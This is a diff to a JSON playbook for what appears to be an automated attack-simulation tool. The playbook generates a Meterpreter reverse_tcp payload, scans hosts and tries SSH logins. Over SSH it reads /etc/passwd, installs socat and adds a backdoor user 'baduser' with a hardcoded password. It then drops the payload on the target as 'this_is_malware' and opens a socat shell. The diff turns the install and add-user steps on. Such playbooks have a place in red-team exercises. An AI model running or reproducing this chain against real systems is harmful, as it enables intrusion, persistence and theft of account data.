@@ -5,7 +5,6 @@
         { "name":"DockerCompose", "action":"up", "compose":"docker/metasploit.yml", "skip":false },
         { "name":"MSFVenom", "payload":"linux/x64/meterpreter/reverse_tcp", "skip":false, "platform":"linux", "format":"elf", "output":"meterpreter-linux" },
         { "name":"Sleep", "input":10 },
-        { "name":"MsfRPC", "command":"exploit", "user":"msf", "password":"msfpassword", "command_argument":"multi/handler", "payload":"linux/x64/meterpreter/reverse_tcp", "skip":false },
         { "name":"ICMPScan", "timeout":5, "update_host":true, "skip": false },
         { "name":"Stop" },
         { 
@@ -16,14 +15,15 @@
                 { "name":"SSHConnectionAttempt" }
             ]
         }, 
+        { "name":"Sleep", "input":10 },        
         {
             "name": "hit_each",
             "loop": true,
             "target": "target",
             "actions": [
                 { "name":"SSHCommandExecution", "skip":true, "commands":"whoami,ps -ef,cat /etc/passwd", "sudo":true },
-                { "name":"InstallPackage", "skip":true, "package":"socat", "sudo":true, "connection":"ssh" },
-                { "name":"AddUser", "skip":true, "connection":"ssh", "username_to_add":"baduser", "new_password":"P@ssw0rd1!" },
+                { "name":"InstallPackage", "skip":false, "package":"socat", "sudo":true, "connection":"ssh" },
+                { "name":"AddUser", "skip":false, "connection":"ssh", "username_to_add":"baduser", "new_password":"P@ssw0rd1!" },
                 { "name":"RemoveUser", "skip":true, "connection":"ssh", "username_to_remove":"baduser" },
                 { "name":"FileSystemWrite", "connection":"ssh", "remote_file":"/home/sysadmin/this_is_malware", "local_file":"/home/sysadmin/workspace/diamondback_rattler/docker/payloads/meterpreter-linux"},
                 { "name":"BindShell", "connection":"socat_reverse", "port":"{random:4444}", "register":"reverse_shell" },
